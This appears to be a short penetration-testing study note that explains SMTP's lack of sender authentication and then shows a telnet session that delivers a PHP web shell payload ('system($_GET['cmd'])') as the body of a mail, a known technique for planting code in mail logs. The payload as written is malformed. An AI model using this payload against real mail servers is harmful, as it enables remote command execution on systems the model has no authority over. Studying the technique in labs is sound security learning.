SMTP (Simple Mail Transfer Protocol) is a foundational protocol for email transmission, playing a critical role in global communication infrastructure. However, its inherent lack of sender authentication makes it vulnerable to email spoofing, where attackers forge the sender's address to deceive recipients into opening malicious messages or divulging sensitive information. This exploitation can lead to phishing attacks, a prevalent cybersecurity threat aimed at tricking users into revealing credentials or clicking on harmful links. Additionally, SMTP's openness has historically enabled spam campaigns, leveraging weaknesses in server configurations or utilizing botnets to flood inboxes with unwanted messages.

--- 
## How to send information through a port

First we need to connect to the server to the port that is running the SMTP and the tools that we are using in here is [[telnet]]

```
# Connect to the service
telnet 127.0.0.1 25

#set the mail
MAIL FROM: test@test.com

#Set the recipient's mail
RCPT TO: username #it can be a user or a mail (dependes on the context)

#Set the information
DATA

#Information of the mail (you need to end with a dot at the end)
php system($\_GET['cmd']) ?
. 

#Quit the session
quit
```
